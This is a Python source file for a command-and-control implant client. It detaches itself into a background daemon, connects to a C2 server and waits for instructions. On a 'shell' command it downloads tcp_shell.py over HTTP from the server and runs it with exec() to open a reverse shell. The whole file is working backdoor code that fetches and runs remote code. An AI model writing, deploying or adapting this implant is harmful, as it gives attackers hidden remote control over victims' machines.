import socket,threading,os,sys

from urllib import request


def make_threaded(func):
    
    def wrapper(*args, **kwargs):
        thread = threading.Thread(target=func, args=args, kwargs=kwargs)
        thread.daemon = True
        thread.start()
        return thread 
    return wrapper

def detach_process():
    """
    Detaches the current process from its controlling terminal and runs it in the background.
    """
    try:
        # Fork the current process
        pid = os.fork()

        if pid > 0:
            # Exit the parent process
            sys.exit(0)
        else:
            # This is the child process

            # Create a new session ID for the child process
            os.setsid()

            # Fork again to ensure the child process is not a session leader
            pid = os.fork()

            if pid > 0:
                # Exit the first child process
                sys.exit(0)
            else:
                # This is the second child process (now a daemon)

                # Change the working directory to the root directory
                os.chdir("/")

                # Close standard file descriptors
                os.close(0)
                os.close(1)
                os.close(2)

                # Open /dev/null for standard input, output, and error
                os.open(os.devnull, os.O_RDWR)
                os.dup2(0, 1)
                os.dup2(0, 2)


    except OSError as e:
        print(f"Error detaching process: {e}")

class client():

    def __init__(self, host, port):
        self.host = host
        self.host_port = port
        self.connection = self.connect()

    #create a connection to C2 server
    def connect(self):
        print("creating connection")
        connection = socket.create_connection((self.host,self.host_port))
        data = connection.recv(1)
        if str(data.decode()) == 'g':
            print("connection established")
            connection.send('g'.encode())
        
        return connection
    
    @make_threaded
    def run_module(self,name):
        url = f"http://{self.host}:5001/{name}.py"
        module = request.urlopen(url).read().decode('utf-8') 
        exec(module)
        return


    #listen for commands
    def run(self):
         while True:
            try:
                instruction = self.connection.recv(1024).decode()
                print(f"Received instruction: {instruction}")
                if not instruction:
                    print("breakingh")
                    break
                elif instruction == 'shell':
                    print("starting  reverse shell")
                    threading.Thread(target=self.run_module, args=('tcp_shell',)).start()
                elif(str(instruction) == 'g'):
                    self.connection.send('g'.encode())

            except Exception as e:
                print(e)
                self.connection.sendall(str(e).encode()) 
        

detach_process()            
c = client('localhost', 5000)
c.run()
print("running")
   